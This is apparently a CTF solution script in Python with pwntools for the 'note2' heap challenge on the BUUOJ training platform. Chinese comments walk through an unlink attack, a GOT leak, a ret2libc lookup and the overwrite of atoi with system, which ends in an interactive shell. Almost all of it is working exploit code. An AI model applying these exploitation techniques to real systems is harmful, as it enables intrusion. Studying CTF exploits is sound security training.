from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './note2'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28693) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'>>',b'1')
    sla(b':',int2bytes(len))
    sla(b':',content)

def show(index):
    sla(b'>>',b'2')
    sla(b':',int2bytes(index))

def edit(index,choice,content):
    sla(b'>>',b'3')
    sla(b':',int2bytes(index))
    sla(b'[1.overwrite/2.append]',int2bytes(choice))
    sla(b':',content)

def delete(index):
    sla(b'>>',b'4')
    sla(b':',int2bytes(index))

#unlink
ptr = 0x602120

fd = ptr - 0x18
bk = ptr - 0x10
atoi_got = elf.got['atoi']
free_got = elf.got['free']

sla(b'name:',b'a')
sla(b'address:',b'b')

payload = p64(0) + p64(0xa1) #fake chunk 大小为0x20
payload += p64(fd) + p64(bk)
# edit(0, 1, payload)
add(0x80,payload) # 0 用于伪造fake chunk
add(0x0,b'a') # 1 用于和fake chunk合并
add(0x80,b'b') # 2

#防止报错和chunk2覆盖chunk1中溢出的内容所以先申请后删除再申请的方式
delete(1)
payload = b'/bin/sh\x00' + p64(0) + p64(0xa0) + p64(0x90)
add(0x0,payload)# 1
delete(2)
#unlink 实现ptr = ptr - 0x18

#利用free_got,限制条件多
# payload = b'a'*0x18+ p64(free_got)  #存在show的情况
# #因为ptr的位置为1号块的地址，所以先用free_got表地址覆盖1号块地址，再用puts_got表覆盖2号块地址
# #这里覆盖一号块好理解，因为等下要把free_got覆盖为puts_plt，但是覆盖二号块我一开始没理解
# #现在理解了，覆盖二号块是为了给free函数传参，等会free(2)中的2就是2号块的地址，这里就换成puts_got实现leek
# edit(0, 1, payload)
#
#
# show(0)   #存在show的情况
# free_addr = uu64(ru('\x7f',drop=False)[-6:])
# log.success('free_addr: ',hex(free_addr))
# system_addr, bin_sh_addr = ret2libc(free_addr,'free')
#
# payload = p64(system_addr)
# #把free_got（原本存放的1号块地址）指向的地址换成system_addr
# edit(0, 1, payload)
#
# delete(3)#这里解释一下为什么是解释是index=3，因为都free了导致ptr里面很多指针都被置空了，动调发现在chunk3
# itr()
#


#利用atoi，限制条件少
payload = b'a'*0x18+ p64(atoi_got)  #存在show的情况
#因为ptr的位置为1号块的地址，所以先用free_got表地址覆盖1号块地址，再用puts_got表覆盖2号块地址
#这里覆盖一号块好理解，因为等下要把free_got覆盖为puts_plt，但是覆盖二号块我一开始没理解
#现在理解了，覆盖二号块是为了给free函数传参，等会free(2)中的2就是2号块的地址，这里就换成puts_got实现leek
edit(0, 1, payload)


show(0)   #存在show的情况
atoi_addr = uu64(ru('\x7f',drop=False)[-6:])
log.success('atoi_addr: ',hex(atoi_addr))
system_addr, bin_sh_addr = ret2libc(atoi_addr,'atoi')

payload = p64(system_addr)
#把free_got（原本存放的1号块地址）指向的地址换成system_addr
edit(0, 1, payload)
sla(b'>>', b'/bin/sh\x00')
itr()

